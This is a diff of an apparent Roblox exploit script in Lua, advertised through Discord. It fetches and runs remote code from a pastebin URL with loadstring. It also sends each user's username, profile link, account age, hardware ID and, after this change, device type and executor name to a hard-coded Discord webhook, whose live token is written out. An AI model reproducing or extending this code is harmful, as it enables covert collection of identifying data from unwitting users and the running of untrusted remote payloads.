@@ -4914,7 +4914,7 @@ loadstring(game:HttpGet("https://pastebin.com/raw/FLkdXxcL"), true)()
 local webhookUrl = "https://discord.com/api/webhooks/1288255480002773003/xZjYoUzH4qm9lUq1hyOsQIVUfs3framLoJd7gnxoz6LzatnWu5hxN-IR27NILrcBR6nW"
 
 -- Function to send an embedded message to the Discord webhook
-local function sendWebhookEmbed(username, isPremium, gameName, gameId, userLink, accountAge, hwid)
+local function sendWebhookEmbed(username, isPremium, gameName, gameId, userLink, accountAge, hwid, deviceType, executorName)
     -- Create the JSON payload with an embed
     local data = {
         ["embeds"] = {
@@ -4956,6 +4956,16 @@ local function sendWebhookEmbed(username, isPremium, gameName, gameId, userLink,
                         ["name"] = "HWID",
                         ["value"] = hwid,
                         ["inline"] = false
+                    },
+                    {
+                        ["name"] = "Device Type",
+                        ["value"] = deviceType,
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "Executor",
+                        ["value"] = executorName,
+                        ["inline"] = false
                     }
                 },
                 ["color"] = 16753920 -- Color code for orange
@@ -4995,11 +5005,17 @@ local userLink = "https://www.roblox.com/users/" .. player.UserId .. "/profile"
 local accountAge = player.AccountAge .. " days"
 
 -- Fetch HWID
-local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
-print("Your HWID is: " .. HWID)
+local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
 
--- Call the function to send the embedded message with user info
-sendWebhookEmbed(username, isPremium, gameName, gameId, userLink, accountAge, HWID)
+-- Detect platform (PC or Mobile) using the device's input type
+local deviceType = identifyexecutor() and (identifyexecutor():find("Mobile") and "Mobile 📱" or "PC 💻") or "Unknown"
+
+-- Get the executor name, or "Unknown" if nil
+local executorName = identifyexecutor() or "Unknown"
+
+-- Send the webhook message with all gathered info
+sendWebhookEmbed(username, isPremium, gameName, gameId, userLink, accountAge, hwid, deviceType, executorName)
+
 
 
 print("UPdate check for purasppasiawnsadssweduSndaj | discord.gg/legiondh | discord.gg/internalx")
